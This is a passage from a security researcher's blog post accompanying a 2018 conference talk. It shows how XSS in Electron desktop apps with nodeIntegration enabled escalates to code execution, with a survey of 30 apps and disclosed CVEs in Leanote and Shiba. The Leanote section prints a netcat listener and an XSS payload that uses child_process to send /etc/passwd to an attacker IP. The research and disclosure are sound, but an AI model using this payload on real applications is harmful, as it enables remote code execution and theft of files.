&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;webpreference-options&quot;&gt;&lt;strong&gt;webPreference options&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;Our next piece of the puzzle is to know that with every new BrowserWindow instance, a set of webPreference options
becomes available. These options are basically a set of features by which we can control the newly created renderer process.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/electron/webPreferences.png&quot; alt=&quot;&quot; title=&quot;WebPreference options&quot; /&gt;&lt;/p&gt;

&lt;p&gt;For example:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;nodeIntegration&lt;/strong&gt;: enable/disable Node.js engine (default: True)&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: enable/disable JavaScript support (default: True)&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;WebSecurity&lt;/strong&gt;: enable/disable Same-origin policy (default: True)&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Sandbox&lt;/strong&gt;: enable/disable the sandbox for the renderer process (default: False)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Based on the previous example project with 3 files, let’s focus here on the nodeIntegration option and let’s say the content
in our index.html file is as shown below. We have a script where we attempt to require the ‘os’ module in order to ask
further questions about the platform and the home directory on which the application is running upon.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;os&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;os&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;hostname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;platform&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;homedir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;homedir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'host'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;innerHTML&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'Hostname: '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;hostname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;/br&amp;gt;'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Home directory'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;homedir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;/br&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/script&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If we place this script into a context where we have set &lt;code class=&quot;highlighter-rouge&quot;&gt;nodeIntegration:True&lt;/code&gt; for the renderer process, we see the
results to questions we asked for. However disabling the same option results in disabling the Node.js engine and losing
the desktop like experience.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/electron/nodeIntegration.png&quot; alt=&quot;&quot; title=&quot;NodeIntegration option&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here it is completely legitimate and the intended behaviour as this is what the framework was designed for us to do.
But let’s keep on digging.&lt;/p&gt;

&lt;h2 id=&quot;cross-site-scripting-xss-vulnerability--nodeintegration-hotpot&quot;&gt;Cross-site scripting (XSS) vulnerability &amp;amp; nodeIntegration hotpot&lt;/h2&gt;

&lt;p&gt;Cross-site scripting has been around since the 90’s and we can pretty much agree on that fighting against it is pretty
much a lost cause, and if there was a button to make XSS disappear, we as the IT security people would most likely not
push it (if you know what I mean). It is not every day we are dealing with desktop applications built only by using web
technologies. As you might remember, I stated in the beginning of this post that vulnerabilities out of their normal
environments should be reappraised as they might end up having unexpected consequences. So let me answer your question:
“&lt;strong&gt;Yes, Electron applications can be vulnerable to XSS&lt;/strong&gt;”, however it also might end up magically evolving into local
or remote code execution as well. So taking our favourite script from the index.html file and sticking it in user input
fields can get you further than what the intended behavior of the application really was.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/electron/xss.png&quot; alt=&quot;&quot; title=&quot;XSS + nodeIntegration:True&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;the-freedom-of-electron&quot;&gt;The Freedom of Electron&lt;/h3&gt;

&lt;p&gt;As Electron is suppose to give you the desktop like experience, a lot of the default values of the provided options in the framework make sure that your applications will sort of work “out-of-the-box”. Let me give you an example. So when you launch your Electron app, you can see that by default all the renderer process are always created with NodeIntegration enabled and without the protective layer of the sandbox. This is for your own convenience here. However too much freedom, and we might have a disaster in our hands.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/electron/freedom.png&quot; alt=&quot;&quot; title=&quot;XSS + nodeIntegration:True&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So while doing this project, based on what I observed or sometimes had a ‘gut feeling’ about, I created some assumptions which led me to believe that:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;developers  would not be too much alarmed about the web vulnerabilities occurring in a desktop environment;&lt;/li&gt;
  &lt;li&gt;as applications worked “out-of-the-box”, developers would not be too familiar with any of the webPreference options they were given by default and most likely leave them untouched (these options were optional anyway, sort of).&lt;/li&gt;
  &lt;li&gt;based on the second assumption, if I manage to find XSS then most likely (it will!) evolve into local or remote code execution.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;To prove my assumptions I took a step further, so bare with me!&lt;/p&gt;

&lt;h3 id=&quot;hunting-for-code-execution&quot;&gt;Hunting for code execution&lt;/h3&gt;

&lt;p&gt;.. proved to be easier than I had imagined. I began with 30 applications selected from Github and decided to gather some
 initial information on the apps I was looking at. You can get more detailed information and specific numbers from my slides, but let’s focus here on the webPreferences and nodeIntegration specifically.&lt;/p&gt;

&lt;p&gt;What I discovered was that those &lt;strong&gt;30 applications&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;created total of &lt;strong&gt;52 new BrowserWindow instances&lt;/strong&gt;;&lt;/li&gt;
  &lt;li&gt;webPreferences (&lt;strong&gt;nodeIntegration&lt;/strong&gt;):
    &lt;ul&gt;
      &lt;li&gt;in &lt;strong&gt;41 cases nodeIntegration was left to its default value&lt;/strong&gt; of True (therefore left untouched as I assumed);&lt;/li&gt;
      &lt;li&gt;in &lt;strong&gt;5 cases nodeIntegration was set to True&lt;/strong&gt; even though this was already its default value;&lt;/li&gt;
      &lt;li&gt;in &lt;strong&gt;6 cases nodeIntegration was set to False&lt;/strong&gt;, so I guess these were the cases where developers were actually aware what this option does.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Based on those numbers, I had &lt;strong&gt;30 applications and 46 promising chances to go and hunt for the XSS-s&lt;/strong&gt; which would evolve into code execution. This also proved my assumption that default options would most likely be left untouched, therfore needing any kind of nodeIntegration bypasses would be extremely rare.&lt;/p&gt;

&lt;p&gt;As a result I ended up with 10 applications with a XSS vulnerability and out of those 9 were my perfect match: XSS &amp;amp;
nodeIntegration:True. So after finding the XSS, it was highly likely that nodeIntegration option would also be enabled.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/electron/findings.png&quot; alt=&quot;&quot; title=&quot;XSS + nodeIntegration:True&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;poc-leanote---knowledge-blog-sharing-cooperation-all-in-leanote&quot;&gt;PoC: Leanote - “Knowledge, Blog, Sharing, Cooperation… all in Leanote”&lt;/h2&gt;

&lt;p&gt;Reported: 25, Nov, 2017&lt;br /&gt;
Fixed: 29, Nov 2017 (version 2.6)&lt;/p&gt;

&lt;p&gt;Leanote is a note-keeping/note-sharing desktop application which by feature allows you to synchronize your data from its web application. The vulnerable field, which led to code execution (&lt;strong&gt;CVE 2017-1000492&lt;/strong&gt;) was the title of the created
note which the user marked as favourite. This application was a perfect case of a vulnerability not being present in the
web application, but as soon as the notes with the attack code were synchronised onto the desktop things got bad.&lt;/p&gt;

&lt;p&gt;PoC code was presented by using the &lt;a href=&quot;https://nodejs.org/api/child_process.html&quot;&gt;child_process&lt;/a&gt; module from the built-in
Node.js modules in order to get a reverse shell connecting back to the attacker’s machine and stealing the victim’s
/etc/passwd file.&lt;/p&gt;

&lt;p&gt;Attacker launched from command line:: &lt;code class=&quot;highlighter-rouge&quot;&gt;nc -l -p 1337 &amp;gt; passwd.txt&lt;/code&gt;&lt;br /&gt;
Attacker creates a new favourite note with a crafted payload to the victim’s notebook:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;s &amp;lt;onmouseover=&quot;alert(1)&quot;&amp;gt; &amp;lt;s onmouseover=&quot;const exec= require('child_process').exec;
exec('nc -w 3 192.168.8.100 1337 &amp;lt; /etc/passwd', (e, stdout, stderr)=&amp;gt; { if (e instanceof Error) {
console.error(e); throw e; } console.log('stdout ', stdout);
console.log('stderr ', stderr);});
alert('1')&quot;&amp;gt;Hallo&amp;lt;/s&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;If this is not the easiest code execution you have ever seen, then I don’t know what is!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/electron/leanote.png&quot; alt=&quot;&quot; title=&quot;Leanote&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;poc-shiba---rich-markdown-live-preview-app&quot;&gt;PoC: Shiba - rich markdown live preview app&lt;/h2&gt;

&lt;p&gt;Reported: 25, Nov, 2017 v1.1.0&lt;br /&gt;
Fixed: 30, Nov 2017 (version v1.1.1)&lt;/p&gt;

&lt;p&gt;Shiba is a markdown editor, where the vulnerable field happened to be the file content field (&lt;strong&gt;CVE 2017-1000491&lt;/strong&gt;) itself.
So if the attacker manages to trick the victim to open any kind of crafted file within the Shiba app, it’s game over.
Let’s use the same PoC code as in the previous example to illustrate better the essence of how easily XSS can evolve
into code execution in Electron apps.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/electron/shiba3_wmv.gif&quot; alt=&quot;&quot; title=&quot;Shiba - PoC&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;takeaway--ideas&quot;&gt;Takeaway &amp;amp; ideas&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Takeaways:&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;electron is a wonderful framework for easy multi-platform development for desktop applications, specially if you have
never developed for desktop before&lt;/li&gt;
  &lt;li&gt;my personal takeaway was definitely validation to my assumptions.Developers have come to experiement in the new playing field and “old habits die hard”, so the web-vulnerabilities emerge in new environment and quite often&lt;/li&gt;
  &lt;li&gt;if the framework provides you with a lot of freedom for your applications to work “out-of-the-box”, the webprefeence options are most likely left untouched. Even when we are dealing with, let’s say static pages which do not need access to interacting with the system.&lt;/li&gt;
  &lt;li&gt;Electron is a wonderful playing field at the moment with lots of golden findings&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Ideas:&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;future developement? Limit the attacker’s activities in case of XSS by restricting to require any extra modules than specifically marked in the application’s configuration file.&lt;/li&gt;
  &lt;li&gt;Set nodeIntegration option to False by default:
    &lt;ul&gt;
      &lt;li&gt;It would need an extra movement from the developers if interaction with the system is necessary within the renderer process. However, if interacting with the system underneath the application is not needed, then the Node.js engine would already be set to false by default (safer option, as devs do not pay enough attention to those options or if its simpy forgotten). This could reduce the potential severity of the cross-site scripting vulnerabilities if such occurrs.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;</content><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><summary type="html">This article is supporting my talk at the NorthSec 2018 conference in Montreal titled “Only an Electron Away from Code Execution” and the corresponding slides can be found here.</summary></entry></feed>